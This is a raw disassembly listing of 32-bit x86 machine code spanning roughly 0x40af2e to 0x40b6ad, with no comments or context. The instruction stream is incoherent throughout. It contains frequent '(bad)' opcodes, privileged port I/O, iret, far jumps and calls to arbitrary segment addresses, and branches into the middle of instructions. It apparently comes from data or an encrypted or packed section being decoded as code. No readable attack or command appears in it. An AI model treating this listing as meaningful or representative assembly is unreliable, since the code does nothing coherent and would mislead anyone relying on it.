  40af2e:	mov    bh,0x10
  40af30:	push   ebp
  40af31:	jle    0x40af84
  40af33:	sti    
  40af34:	imul   ebx,ebx,0x57456afa
  40af3a:	or     ah,ah
  40af3c:	jg     0x40af2a
  40af3e:	add    esi,DWORD PTR [eax]
  40af40:	not    BYTE PTR [ebp-0x2f]
  40af43:	aad    0xe0
  40af45:	aad    0xf8
  40af47:	dec    ecx
  40af48:	mov    ch,0x35
  40af4a:	add    esi,DWORD PTR [ebx]
  40af4c:	pop    esp
  40af4d:	lahf   
  40af4e:	mov    ebp,0xdd87f450
  40af53:	dec    DWORD PTR es:[edx]
  40af56:	adc    al,0x8d
  40af58:	repz call 0x27579adf
  40af5e:	mov    dh,0x35
  40af60:	jecxz  0x40af9f
  40af62:	xchg   ebp,eax
  40af63:	mov    edx,fs
  40af65:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40af67:	and    DWORD PTR ds:0x99840ffd,ecx
  40af6d:	dec    ebx
  40af6e:	inc    ebx
  40af6f:	adc    BYTE PTR ds:0x26420b14,dh
  40af75:	inc    edi
  40af76:	adc    eax,0xd69db5e3
  40af7b:	xor    eax,0x854f8bcb
  40af80:	sub    al,BYTE PTR [esi]
  40af82:	ret    
  40af83:	shl    DWORD PTR [edi-0x65],cl
  40af86:	mov    eax,ds:0x127622db
  40af8b:	xchg   esp,eax
  40af8c:	aad    0x71
  40af8e:	enter  0x19cf,0x26
  40af92:	pop    ss
  40af93:	inc    edi
  40af94:	jecxz  0x40af9e
  40af96:	dec    edi
  40af97:	iret   
  40af98:	xchg   esp,eax
  40af99:	pushf  
  40af9a:	js     0x40af35
  40af9c:	mov    cl,BYTE PTR [ebx-0x3330c2ef]
  40afa2:	push   0xffffff94
  40afa4:	out    0xa3,eax
  40afa6:	dec    ebp
  40afa7:	or     dl,BYTE PTR [ecx]
  40afa9:	mov    edx,0x5d32eab0
  40afae:	fsub   DWORD PTR [ebx]
  40afb0:	mov    bl,0x6
  40afb2:	dec    ecx
  40afb3:	and    esp,eax
  40afb5:	(bad)  
  40afb8:	and    al,0xe0
  40afba:	sbb    eax,edi
  40afbc:	imul   ecx,eax,0x37
  40afbf:	or     eax,0x36fad657
  40afc4:	add    BYTE PTR [esi+ebp*1],bh
  40afc7:	adc    BYTE PTR [eax+esi*4],0x4f
  40afcb:	cmp    al,0x8d
  40afcd:	sub    dl,BYTE PTR [ebx+0x3e66c282]
  40afd3:	push   0xd514052b
  40afd8:	imul   esi,DWORD PTR [ebp+eax*4+0x63],0xfffffff2
  40afdd:	dec    edi
  40afde:	adc    al,ah
  40afe0:	sub    edx,esp
  40afe2:	sub    eax,0x7343ea6e
  40afe7:	push   ecx
  40afe8:	jp     0x40afb1
  40afea:	adc    al,0x1b
  40afec:	sub    al,0xa1
  40afee:	(bad)  
  40afef:	arpl   WORD PTR [ebx+ebx*8],di
  40aff2:	push   es
  40aff3:	aaa    
  40aff4:	xor    ch,al
  40aff6:	sbb    BYTE PTR [eax],0xc8
  40aff9:	dec    edi
  40affa:	and    bh,BYTE PTR [eax+0x1b90ff2b]
  40b000:	push   ecx
  40b001:	push   ecx
  40b002:	pop    ecx
  40b003:	inc    ecx
  40b004:	enter  0x8d0a,0xe
  40b008:	ins    DWORD PTR es:[edi],dx
  40b009:	add    cl,BYTE PTR [esi-0x47]
  40b00c:	cdq    
  40b00d:	mov    ebx,0xba57b355
  40b012:	adc    al,bl
  40b014:	push   esi
  40b015:	xchg   cl,ah
  40b017:	push   es
  40b018:	cdq    
  40b019:	aam    0xa6
  40b01b:	sub    ebx,edx
  40b01d:	leave  
  40b01e:	jmp    FWORD PTR [esi]
  40b020:	mov    DWORD PTR [eax+0xb],ebp
  40b023:	push   eax
  40b024:	xchg   ecx,eax
  40b025:	out    dx,al
  40b026:	(bad)  
  40b027:	js     0x40affe
  40b029:	inc    edx
  40b02a:	jl     0x40afbb
  40b02c:	push   ebx
  40b02d:	test   ecx,esp
  40b02f:	loopne 0x40afcc
  40b031:	sub    edi,edi
  40b033:	sar    dl,0x63
  40b036:	xor    eax,0x8126e14d
  40b03b:	cli    
  40b03c:	les    esp,FWORD PTR [esi+0x74]
  40b03f:	inc    ebx
  40b040:	loopne 0x40aff0
  40b042:	adc    dh,BYTE PTR [esi]
  40b044:	mov    ss,WORD PTR [esi+0x2b]
  40b047:	ja     0x40afcb
  40b049:	cli    
  40b04a:	aam    0x6
  40b04c:	push   ebp
  40b04d:	in     al,dx
  40b04e:	cmc    
  40b04f:	pop    edx
  40b050:	jge    0x40b092
  40b052:	call   DWORD PTR [ebx-0x62ebd624]
  40b058:	fucomi st,st(4)
  40b05a:	mov    esi,0x5b25e4fd
  40b05f:	push   eax
  40b060:	popa   
  40b061:	xor    BYTE PTR [edi-0x77b9cfdb],ch
  40b067:	dec    eax
  40b068:	jno    0x40b0e8
  40b06a:	sub    al,BYTE PTR [esi-0x76]
  40b06d:	add    eax,0xa819f4e0
  40b072:	gs xchg esi,eax
  40b074:	pop    esp
  40b075:	call   0xc5dfa1c0
  40b07a:	or     cl,BYTE PTR [edi+eiz*4]
  40b07d:	dec    ebx
  40b07e:	sbb    al,0x98
  40b080:	mov    esi,0xff944322
  40b085:	jmp    0x2485:0x41b0d96c
  40b08c:	mov    dl,0xd8
  40b08e:	xor    ebx,ecx
  40b090:	jmp    0x40b0ab
  40b092:	arpl   WORD PTR [ecx+0x2fd6a730],cx
  40b098:	cmp    ah,ah
  40b09a:	ret    
  40b09b:	add    BYTE PTR [ebx+0x6ef2cf91],bh
  40b0a1:	jmp    0x40b02b
  40b0a3:	int3   
  40b0a4:	jmp    0xace91ba7
  40b0a9:	mov    ebx,0x6a78f982
  40b0ae:	dec    ebx
  40b0af:	sbb    dl,BYTE PTR [edi-0x46247741]
  40b0b5:	lahf   
  40b0b6:	stos   DWORD PTR es:[edi],eax
  40b0b7:	idiv   BYTE PTR [esi+0x74d5cfdf]
  40b0bd:	ror    DWORD PTR ss:[edi],1
  40b0c0:	mov    ds:0x92a2700b,al
  40b0c5:	fild   QWORD PTR [ecx+0x157be66d]
  40b0cb:	leave  
  40b0cc:	push   eax
  40b0cd:	stos   DWORD PTR es:[edi],eax
  40b0ce:	ret    
  40b0cf:	cdq    
  40b0d0:	cmp    eax,0x1b9427aa
  40b0d5:	cwde   
  40b0d6:	mov    edi,0x49e3e2df
  40b0db:	lds    eax,FWORD PTR [ecx-0x35]
  40b0de:	jb     0x40b0bc
  40b0e0:	mov    ecx,0xb0a8e225
  40b0e5:	sbb    BYTE PTR [edx+eiz*8-0x35],0x74
  40b0ea:	push   ss
  40b0eb:	pop    ebx
  40b0ec:	mov    bh,0x6d
  40b0ee:	stos   DWORD PTR es:[edi],eax
  40b0ef:	jmp    0x1cfd:0xf047941
  40b0f6:	stc    
  40b0f7:	js     0x40b137
  40b0f9:	aas    
  40b0fa:	lahf   
  40b0fb:	rcr    bl,cl
  40b0fd:	jg     0x40b0b5
  40b0ff:	dec    eax
  40b100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b101:	retf   
  40b102:	ja     0x40b0aa
  40b104:	xlat   BYTE PTR ds:[ebx]
  40b105:	pop    ecx
  40b106:	or     edx,DWORD PTR [ecx+0x78]
  40b109:	ja     0x40b188
  40b10b:	jl     0x40b0f9
  40b10d:	call   0xf99b:0x17a4a87d
  40b114:	mov    ch,0xb3
  40b116:	mov    edi,0x559ae12d
  40b11b:	adc    bl,BYTE PTR [edx+0x37ed601b]
  40b121:	imul   ebx,DWORD PTR [esi-0x16],0xfffffffa
  40b125:	fild   DWORD PTR [esp+esi*2-0x1f847dec]
  40b12c:	push   ecx
  40b12d:	inc    esp
  40b12e:	mov    ds:0x8b2d22dd,eax
  40b133:	rcr    DWORD PTR [ecx+0x52],1
  40b136:	lods   eax,DWORD PTR ds:[esi]
  40b137:	or     eax,0x8ce4ed15
  40b13c:	inc    ebx
  40b13d:	arpl   WORD PTR [edx-0x1f],cx
  40b140:	jne    0x40b0d9
  40b142:	mov    ebx,0xfe57a0b3
  40b147:	dec    eax
  40b148:	or     esp,0xffffffc9
  40b14b:	push   edx
  40b14c:	cmc    
  40b14d:	call   0xd17e:0x7a12b63c
  40b154:	lea    esi,[edi]
  40b156:	mov    esp,0x7fb9a893
  40b15b:	lds    edx,FWORD PTR [edx+0x6e]
  40b15e:	mov    al,0x41
  40b160:	cmp    eax,0x93eae97b
  40b165:	mul    DWORD PTR [edx]
  40b167:	je     0x40b16e
  40b169:	inc    esi
  40b16a:	mov    dl,0xe9
  40b16c:	mov    esi,0x3c197a
  40b171:	push   cs
  40b172:	sbb    edi,DWORD PTR [ecx-0x4a294136]
  40b178:	mov    dl,0xd4
  40b17a:	pop    edi
  40b17b:	inc    edx
  40b17c:	push   ss
  40b17d:	rcl    DWORD PTR [edi+0x60],0x6d
  40b181:	sbb    DWORD PTR [eax],edi
  40b183:	add    al,0x6f
  40b185:	or     bl,dh
  40b187:	out    0xa3,al
  40b189:	dec    esi
  40b18a:	ins    DWORD PTR es:[edi],dx
  40b18b:	loopne 0x40b1ec
  40b18d:	daa    
  40b18e:	sub    BYTE PTR [edi-0x3e615811],0x29
  40b195:	iret   
  40b196:	inc    ebp
  40b197:	mov    ebx,0xb236628c
  40b19c:	xchg   edx,eax
  40b19d:	outs   dx,BYTE PTR ds:[esi]
  40b19e:	push   ebp
  40b19f:	test   eax,0x651bf32f
  40b1a4:	(bad)  
  40b1a5:	loopne 0x40b1fa
  40b1a7:	xchg   edx,eax
  40b1a8:	add    BYTE PTR [ebx-0x720997dc],dh
  40b1ae:	ins    BYTE PTR es:[edi],dx
  40b1af:	popa   
  40b1b0:	dec    ecx
  40b1b1:	mov    esp,0xaeb2e7d2
  40b1b6:	loopne 0x40b15a
  40b1b8:	sub    esi,ebp
  40b1ba:	dec    edx
  40b1bb:	mov    edx,0x1fd10cee
  40b1c0:	imul   cl
  40b1c2:	adc    eax,0xf53bca2c
  40b1c7:	fiadd  WORD PTR [ecx]
  40b1c9:	sar    BYTE PTR [ebp+0x9],0x3e
  40b1cd:	in     eax,0xa0
  40b1cf:	pop    edx
  40b1d0:	dec    ebp
  40b1d1:	dec    ebp
  40b1d2:	rcr    DWORD PTR [ebp-0x5a63e65b],cl
  40b1d8:	adc    DWORD PTR [eax],ebp
  40b1da:	and    eax,0x504ea071
  40b1e0:	xchg   edi,eax
  40b1e1:	sbb    DWORD PTR [edx],edx
  40b1e3:	mov    dh,0x8c
  40b1e5:	sbb    dl,dl
  40b1e7:	aas    
  40b1e8:	pushf  
  40b1e9:	out    dx,eax
  40b1ea:	(bad)  
  40b1eb:	sti    
  40b1ec:	pop    ebp
  40b1ed:	sbb    BYTE PTR [esi],dh
  40b1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f0:	add    DWORD PTR [eax-0x715d31ab],edx
  40b1f6:	cwde   
  40b1f7:	stos   DWORD PTR es:[edi],eax
  40b1f8:	ficomp WORD PTR [eax-0x51]
  40b1fb:	xlat   BYTE PTR ds:[ebx]
  40b1fc:	jae    0x40b1e3
  40b1fe:	outs   dx,DWORD PTR ds:[esi]
  40b1ff:	push   esp
  40b200:	mov    DWORD PTR [edi+0xa12fd5a],edx
  40b206:	aas    
  40b207:	ret    0x6e71
  40b20a:	adc    cl,BYTE PTR [esi+edx*1]
  40b20d:	in     al,0x6d
  40b20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b210:	sub    eax,DWORD PTR ds:0xa32615ce
  40b216:	inc    edi
  40b217:	test   al,0x64
  40b219:	jae    0x40b206
  40b21b:	outs   dx,BYTE PTR ds:[esi]
  40b21c:	lahf   
  40b21d:	dec    esi
  40b21e:	lds    edi,FWORD PTR [eax]
  40b220:	fisubr DWORD PTR [ecx+0x44]
  40b223:	xchg   edi,eax
  40b224:	inc    eax
  40b225:	inc    esi
  40b226:	inc    ebp
  40b227:	xchg   edx,eax
  40b228:	inc    edi
  40b229:	jl     0x40b262
  40b22b:	xor    DWORD PTR [edi-0x7cd69632],ebp
  40b231:	sbb    eax,0x5850703d
  40b236:	dec    ebp
  40b237:	sub    BYTE PTR [eax],ah
  40b239:	(bad)  
  40b23a:	or     DWORD PTR [eax+0x563b42d7],edx
  40b240:	lods   eax,DWORD PTR ds:[esi]
  40b241:	pop    edx
  40b242:	clc    
  40b243:	push   0x24
  40b245:	add    al,0x96
  40b247:	xor    bl,ch
  40b249:	pop    es
  40b24a:	cmp    ebx,ebp
  40b24c:	out    dx,al
  40b24d:	jne    0x40b27a
  40b24f:	(bad)  
  40b250:	adc    ebp,DWORD PTR [edx+0x3f313aed]
  40b256:	push   esp
  40b257:	cs (bad) 
  40b25a:	and    edi,eax
  40b25c:	mov    ecx,0xa85bcc02
  40b261:	inc    edi
  40b262:	out    0x7b,al
  40b264:	inc    ecx
  40b265:	inc    edx
  40b266:	push   0xffffffa5
  40b268:	or     ch,BYTE PTR ds:0x75b2955a
  40b26e:	jae    0x40b20c
  40b270:	and    esi,edi
  40b272:	xchg   edi,eax
  40b273:	xor    esi,DWORD PTR [edx-0x39]
  40b276:	cli    
  40b277:	ret    0xcb0
  40b27a:	retf   
  40b27b:	jb     0x40b20c
  40b27d:	add    ch,BYTE PTR [eax+edi*2-0x62]
  40b281:	push   edi
  40b282:	inc    ebx
  40b283:	add    eax,0xabdbe20
  40b288:	and    dh,ch
  40b28a:	lds    edx,FWORD PTR ds:0x7c439306
  40b290:	jnp    0x40b29c
  40b292:	(bad)
  40b295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b296:	inc    ecx
  40b297:	push   0xffffff8d
  40b299:	mov    bl,BYTE PTR [edi+0x2a546aee]
  40b29f:	push   0x3e
  40b2a1:	in     eax,dx
  40b2a2:	(bad)  
  40b2a4:	inc    ebp
  40b2a5:	jecxz  0x40b2ed
  40b2a7:	xor    esi,DWORD PTR [ebp+eax*2-0x77]
  40b2ab:	xchg   esp,eax
  40b2ac:	push   esi
  40b2ad:	call   0x89d6:0x2f8d20a9
  40b2b4:	mov    cl,0xd5
  40b2b6:	xlat   BYTE PTR ds:[ebx]
  40b2b7:	pop    eax
  40b2b8:	or     BYTE PTR [ecx-0x5ed77e3a],bh
  40b2be:	jns    0x40b2a2
  40b2c0:	out    0xf7,al
  40b2c2:	shr    DWORD PTR [ecx-0x495423ed],0x86
  40b2c9:	mov    DWORD PTR [esi],0xb4527cb
  40b2cf:	jb     0x40b28a
  40b2d1:	push   0xc2adb15b
  40b2d6:	adc    ah,dh
  40b2d8:	(bad)
  40b2dc:	adc    cl,al
  40b2de:	ds adc al,0xc3
  40b2e1:	loopne 0x40b26a
  40b2e3:	lahf   
  40b2e4:	push   ecx
  40b2e5:	sahf   
  40b2e6:	pop    esp
  40b2e7:	adc    dl,BYTE PTR [esi+0x6]
  40b2ea:	mov    ch,0xe0
  40b2ec:	aas    
  40b2ed:	sub    BYTE PTR [esi],0x6a
  40b2f0:	xor    dh,BYTE PTR [esi+0x612a410d]
  40b2f6:	test   esi,ebx
  40b2f8:	mov    dl,BYTE PTR [edi-0x7ae19a64]
  40b2fe:	mov    ebp,edx
  40b300:	outs   dx,DWORD PTR ds:[esi]
  40b301:	hlt    
  40b302:	dec    esp
  40b303:	pop    ds
  40b304:	push   ecx
  40b305:	jecxz  0x40b37f
  40b307:	retf   0xd00f
  40b30a:	cdq    
  40b30b:	daa    
  40b30c:	jnp    0x40b2e0
  40b30e:	inc    edx
  40b30f:	lods   eax,DWORD PTR ds:[esi]
  40b310:	sbb    ecx,ebp
  40b312:	inc    ecx
  40b313:	outs   dx,DWORD PTR ds:[esi]
  40b314:	dec    ecx
  40b315:	mov    fs,WORD PTR [eax-0x6dcd7b7a]
  40b31b:	je     0x40b371
  40b31d:	ror    BYTE PTR [esi-0x3f],0xe9
  40b321:	push   0xffffffd9
  40b323:	or     ecx,DWORD PTR [ebx+ebx*8+0x53]
  40b327:	sahf   
  40b328:	jmp    0x2b19:0xc8bd553a
  40b32f:	ds mov bl,0x9c
  40b332:	and    al,0x56
  40b334:	adc    DWORD PTR [ebp-0x7],ebx
  40b337:	pop    eax
  40b338:	in     al,dx
  40b339:	sbb    eax,0x1a20ba73
  40b33e:	cmc    
  40b33f:	aad    0x16
  40b341:	add    cl,BYTE PTR [ebp-0x38]
  40b344:	aam    0x79
  40b346:	mov    cs,WORD PTR [eax]
  40b348:	outs   dx,BYTE PTR ds:[esi]
  40b349:	mov    dl,0x33
  40b34b:	sbb    eax,0xd221dda5
  40b350:	push   esi
  40b351:	leave  
  40b352:	icebp  
  40b353:	jl     0x40b395
  40b355:	scas   al,BYTE PTR es:[edi]
  40b356:	jge    0x40b3ca
  40b358:	mov    dl,BYTE PTR [ebx+0x6a7d7247]
  40b35e:	dec    eax
  40b35f:	lds    ebx,FWORD PTR [edx+eiz*1+0x3ce9a866]
  40b366:	inc    edi
  40b367:	(bad)  
  40b368:	ficom  WORD PTR [edx-0xc]
  40b36b:	push   ss
  40b36c:	cmp    DWORD PTR [edx+0x33706b1a],esi
  40b372:	pop    ebp
  40b373:	pop    ebp
  40b374:	mov    ebp,eax
  40b376:	nop
  40b377:	jbe    0x40b3ce
  40b379:	(bad)  
  40b37a:	daa    
  40b37b:	imul   esi,esi,0xffffff85
  40b37e:	fdiv   QWORD PTR [ebx-0x4e]
  40b381:	ret    
  40b382:	pop    ecx
  40b383:	sub    ebp,ebx
  40b385:	jns    0x40b34f
  40b387:	sub    DWORD PTR [edx],ebx
  40b389:	std    
  40b38a:	pop    DWORD PTR [edx-0x5a]
  40b38d:	inc    ecx
  40b38e:	iret   
  40b38f:	repnz mov ecx,0xb2cd2da2
  40b395:	out    0xc1,al
  40b397:	ss gs mov ch,0x1f
  40b39b:	aam    0xaa
  40b39d:	push   ebp
  40b39e:	sub    BYTE PTR [edi-0x30],ah
  40b3a1:	enter  0x29b5,0xe1
  40b3a5:	xchg   ebp,eax
  40b3a6:	rcr    BYTE PTR [ecx+0x38],1
  40b3a9:	and    ch,BYTE PTR [edx]
  40b3ab:	pop    edx
  40b3ac:	and    DWORD PTR [ebp+0x60],esp
  40b3af:	sbb    eax,0x9bc26955
  40b3b4:	mov    ah,0x59
  40b3b6:	loopne 0x40b3f3
  40b3b8:	ins    BYTE PTR es:[edi],dx
  40b3b9:	and    DWORD PTR [edx+0x57d3f377],eax
  40b3bf:	retf   
  40b3c0:	pushf  
  40b3c1:	mov    ds:0x60d1d213,eax
  40b3c6:	mov    ebx,0xbbf5604a
  40b3cb:	xor    bh,BYTE PTR [esi]
  40b3cd:	jmp    0x2837:0x7a3a220e
  40b3d4:	mov    DWORD PTR [edx+0x70db3551],edx
  40b3da:	mul    DWORD PTR [esi-0x7e26f715]
  40b3e0:	repnz dec ecx
  40b3e2:	add    eax,0xfafd9a0a
  40b3e7:	les    ebx,FWORD PTR [ebx-0x4e]
  40b3ea:	fs push edx
  40b3ec:	add    ch,ah
  40b3ee:	xor    al,0x22
  40b3f0:	shl    DWORD PTR [esi-0x1d],0x97
  40b3f4:	push   0x76
  40b3f6:	xchg   BYTE PTR [ecx+0x2496fe90],cl
  40b3fc:	mov    ds:0xcbbf48a5,eax
  40b401:	dec    ebp
  40b402:	push   es
  40b403:	pushf  
  40b404:	mov    edx,0x7e221641
  40b409:	data16 or dh,cl
  40b40c:	leave  
  40b40d:	gs dec ebp
  40b40f:	xor    ebp,DWORD PTR [edx-0x38782e09]
  40b415:	mov    edi,DWORD PTR [edx+0x55]
  40b418:	xchg   ebx,eax
  40b419:	push   ebp
  40b41a:	push   ebp
  40b41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b41c:	ret    
  40b41d:	ins    DWORD PTR es:[edi],dx
  40b41e:	pop    ebx
  40b41f:	sbb    eax,0x433214ad
  40b424:	mov    esp,0x51ada584
  40b429:	stc    
  40b42a:	jnp    0x40b47c
  40b42c:	sbb    al,BYTE PTR [ebp-0x5c3ebf9a]
  40b432:	push   eax
  40b433:	fcompp 
  40b435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b436:	jne    0x40b414
  40b438:	cmp    BYTE PTR [ebx+0x4f],al
  40b43b:	jl     0x40b402
  40b43d:	jne    0x40b3e5
  40b43f:	lods   al,BYTE PTR ds:[esi]
  40b440:	dec    edi
  40b441:	in     al,0x39
  40b443:	mov    gs,WORD PTR ds:0xe7b31662
  40b449:	mov    ebx,0xf6539791
  40b44e:	arpl   WORD PTR [ebx+0x7e],di
  40b451:	pop    ds
  40b452:	repnz sub ch,BYTE PTR [ecx]
  40b455:	jb     0x40b481
  40b457:	mov    ebp,0xf286819d
  40b45c:	mov    al,ds:0xe6287bbb
  40b461:	dec    esi
  40b462:	clc    
  40b463:	sub    edx,DWORD PTR [edx]
  40b465:	adc    eax,0xeff87893
  40b46a:	add    DWORD PTR [edi],esp
  40b46c:	(bad)  
  40b46e:	dec    edx
  40b46f:	loop   0x40b469
  40b471:	adc    DWORD PTR [edi+0x31b82b2d],0x67d1cde6
  40b47b:	sub    cl,BYTE PTR [edx+esi*2]
  40b47e:	stos   DWORD PTR es:[edi],eax
  40b47f:	rol    DWORD PTR [ecx-0x2f],1
  40b482:	and    ebp,DWORD PTR [edx]
  40b484:	loopne 0x40b40a
  40b486:	clc    
  40b487:	gs mov esi,0x471102d6
  40b48d:	sbb    BYTE PTR [edx+0x46],ch
  40b490:	in     eax,dx
  40b491:	ret    0xee4f
  40b494:	bound  ebp,QWORD PTR [edx+edi*2]
  40b497:	cmp    dh,BYTE PTR [ebp+0x1b]
  40b49a:	pop    ebx
  40b49b:	or     dh,0xd6
  40b49e:	fnsave [ebp+0x5e1e451b]
  40b4a4:	cmp    BYTE PTR [ebx-0x7c],cl
  40b4a7:	cmp    bl,BYTE PTR ds:0x10850f46
  40b4ad:	jmp    0x40b51d
  40b4af:	mov    ebp,DWORD PTR [eax+0x6d]
  40b4b2:	out    dx,eax
  40b4b3:	jo     0x40b52a
  40b4b5:	ja     0x40b4c2
  40b4b7:	xor    eax,0x3d4dab6f
  40b4bc:	pop    ss
  40b4bd:	pop    ss
  40b4be:	test   ecx,0x7aee07fd
  40b4c4:	inc    ebx
  40b4c5:	iret   
  40b4c6:	mov    edi,DWORD PTR [ecx-0x69]
  40b4c9:	fidiv  WORD PTR [ebx+0x70]
  40b4cc:	push   0x9f7c28bb
  40b4d1:	xor    ebp,ebx
  40b4d3:	sub    eax,0x3a8c4d15
  40b4d8:	(bad)  
  40b4d9:	and    al,0xeb
  40b4db:	xchg   edi,eax
  40b4dc:	in     al,dx
  40b4dd:	hlt    
  40b4de:	stc    
  40b4df:	imul   BYTE PTR [ebx+0x4b]
  40b4e2:	jae    0x40b4dd
  40b4e4:	mov    ch,dl
  40b4e6:	xchg   cx,ax
  40b4e8:	cmp    esp,DWORD PTR [esi+0x1e3228d1]
  40b4ee:	clc    
  40b4ef:	repnz cmp bl,0x4c
  40b4f3:	xchg   BYTE PTR [esi+edi*1+0x6a],cl
  40b4f7:	push   ds
  40b4f8:	lods   al,BYTE PTR ds:[esi]
  40b4f9:	in     al,dx
  40b4fa:	add    BYTE PTR [ebx+0x7a1943b],bh
  40b500:	jle    0x40b502
  40b502:	mov    bh,0x19
  40b504:	and    ch,bl
  40b506:	lods   eax,DWORD PTR ds:[esi]
  40b507:	mov    ebp,0x7b371e78
  40b50c:	fdiv   QWORD PTR [ecx+eiz*1-0x55]
  40b510:	les    edi,FWORD PTR [edx+0x56]
  40b513:	(bad)
  40b516:	adc    eax,0x724864d6
  40b51b:	pmaxub mm6,QWORD PTR [ecx]
  40b51e:	shr    ch,1
  40b520:	push   ecx
  40b521:	es push ebp
  40b523:	adc    al,0xb8
  40b525:	sti    
  40b526:	data16 (bad) 
  40b528:	jmp    0xded488b8
  40b52d:	(bad)  
  40b52e:	hlt    
  40b52f:	or     ebp,ecx
  40b531:	push   ebx
  40b532:	xor    BYTE PTR [esi],0x4e
  40b535:	adc    ch,cl
  40b537:	xor    eax,DWORD PTR [edx]
  40b539:	int3   
  40b53a:	lea    ebp,[edx]
  40b53c:	(bad)  
  40b53d:	out    dx,eax
  40b53e:	adc    eax,0x34ff0734
  40b543:	add    BYTE PTR ds:0x6857fb1,cl
  40b549:	sti    
  40b54a:	xchg   ebp,eax
  40b54b:	cmp    DWORD PTR [ecx-0xf],ebp
  40b54e:	popa   
  40b54f:	shl    ch,1
  40b551:	inc    esi
  40b552:	inc    ebx
  40b553:	sub    eax,DWORD PTR [esi]
  40b555:	sub    BYTE PTR [ebp-0x18],al
  40b558:	pusha  
  40b559:	in     eax,dx
  40b55a:	scas   al,BYTE PTR es:[edi]
  40b55b:	ficomp DWORD PTR ds:0x93c4da46
  40b561:	retf   0x946f
  40b564:	fidivr DWORD PTR [ecx-0x10]
  40b567:	test   BYTE PTR [ebx],ah
  40b569:	push   0x790c8bc6
  40b56e:	(bad)  
  40b56f:	aas    
  40b570:	inc    ebx
  40b571:	shl    edi,1
  40b573:	loope  0x40b521
  40b575:	mov    bh,0xbe
  40b577:	sahf   
  40b578:	enter  0x2815,0x68
  40b57c:	xor    DWORD PTR [edi],esp
  40b57e:	adc    ah,BYTE PTR [ebx-0xc1a38ea]
  40b584:	cmp    DWORD PTR [esi-0x44ea1563],0x15
  40b58b:	sti    
  40b58c:	xor    DWORD PTR [eax-0xe831a81],ebx
  40b592:	sbb    al,0xe1
  40b594:	adc    al,0xb6
  40b596:	adc    dh,bh
  40b598:	mov    al,0xfc
  40b59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b59b:	jno    0x40b611
  40b59d:	cmp    BYTE PTR [esi-0x12824a1],0xf
  40b5a4:	jecxz  0x40b5eb
  40b5a6:	in     al,dx
  40b5a7:	dec    esi
  40b5a8:	out    dx,eax
  40b5a9:	aas    
  40b5aa:	cmc    
  40b5ab:	mov    ds:0xa56ef582,al
  40b5b0:	in     al,0x62
  40b5b2:	das    
  40b5b3:	jmp    0x40b5f3
  40b5b5:	jmp    0xc8c79fb4
  40b5ba:	pop    ecx
  40b5bb:	mov    ah,0x63
  40b5bd:	xor    al,0x25
  40b5bf:	pop    ebp
  40b5c0:	dec    eax
  40b5c1:	xor    dl,BYTE PTR [ecx-0x7457ed67]
  40b5c7:	add    BYTE PTR [ebx+0xa9f5870],ch
  40b5cd:	mov    bl,bh
  40b5cf:	les    eax,FWORD PTR [edx+edi*8-0x6f41af56]
  40b5d6:	jp     0x40b60c
  40b5d8:	in     eax,dx
  40b5d9:	loop   0x40b645
  40b5db:	mov    ebx,0x6c9e86b3
  40b5e0:	scas   eax,DWORD PTR es:[edi]
  40b5e1:	jg     0x40b654
  40b5e3:	xchg   edx,eax
  40b5e4:	dec    ebx
  40b5e5:	dec    ebp
  40b5e6:	inc    ebx
  40b5e7:	aam    0x70
  40b5e9:	sbb    al,0xa7
  40b5eb:	add    al,BYTE PTR [ebp-0x31e398c6]
  40b5f1:	(bad)  
  40b5f2:	icebp  
  40b5f3:	add    BYTE PTR [esi-0x5ee0a382],ch
  40b5f9:	push   eax
  40b5fa:	paddb  mm4,QWORD PTR [ebp+0x1d561635]
  40b601:	mov    ecx,0xea319219
  40b606:	mov    dl,0x5
  40b608:	sub    al,0xc7
  40b60a:	ret    0xb4bb
  40b60d:	and    DWORD PTR [ebp+0x44],0x5fe2e39a
  40b614:	(bad)  
  40b615:	add    bl,BYTE PTR [ebx-0x4142dacb]
  40b61b:	xchg   ecx,eax
  40b61c:	jecxz  0x40b69d
  40b61e:	inc    ebp
  40b61f:	fild   WORD PTR [ecx-0x71]
  40b622:	add    DWORD PTR [edi+0x3e],edi
  40b625:	mov    esi,DWORD PTR [eax+0x3c]
  40b628:	pop    ebx
  40b629:	cmp    bl,BYTE PTR [ebx+0x3b]
  40b62c:	push   0xffffffd8
  40b62e:	(bad)  [edi]
  40b630:	and    eax,0x2ca227aa
  40b635:	xrstor [ecx+0x4e]
  40b639:	xchg   ebp,eax
  40b63a:	mov    bh,0x24
  40b63c:	fs cli 
  40b63e:	je     0x40b5f4
  40b640:	repz jne 0x40b5e7
  40b643:	lahf   
  40b644:	call   0x5807:0xda44af67
  40b64b:	jmp    0x5aed49a8
  40b650:	dec    edi
  40b651:	mov    dl,0x3b
  40b653:	inc    ebx
  40b654:	push   cs
  40b655:	jecxz  0x40b61a
  40b657:	loope  0x40b62e
  40b659:	and    DWORD PTR [ebx],ecx
  40b65b:	mov    dh,0xab
  40b65d:	into   
  40b65e:	fisubr DWORD PTR [esi+0x2e]
  40b661:	cmp    DWORD PTR [ebx+0x22],ebp
  40b664:	ret    
  40b665:	fcomi  st,st(6)
  40b667:	adc    dh,BYTE PTR [ebx+0x7d]
  40b66a:	mov    esp,0x3b307112
  40b66f:	jmp    0x4a72c2c5
  40b674:	or     BYTE PTR gs:[esp+edx*8],al
  40b678:	sbb    eax,0xd18bca4f
  40b67d:	dec    esi
  40b67e:	sub    al,0x24
  40b680:	mov    WORD PTR [ebp+0x20],cs
  40b683:	idiv   bh
  40b685:	stc    
  40b686:	scas   eax,DWORD PTR es:[edi]
  40b687:	cmp    eax,0x4f9614d1
  40b68c:	stc    
  40b68d:	inc    esp
  40b68e:	test   DWORD PTR [edx+0x6f17336],edx
  40b694:	pop    ebx
  40b695:	jbe    0x40b6c0
  40b697:	int3   
  40b698:	and    eax,0x8f7ec615
  40b69d:	repnz cmp cl,BYTE PTR [esi-0x54]
  40b6a1:	int3   
  40b6a2:	mov    cl,cl
  40b6a4:	push   edx
  40b6a5:	pusha  
  40b6a6:	push   edi
  40b6a7:	mov    ecx,0x37d962ec
  40b6ac:	dec    ebp
  40b6ad:	add    eax,0x9aad1848
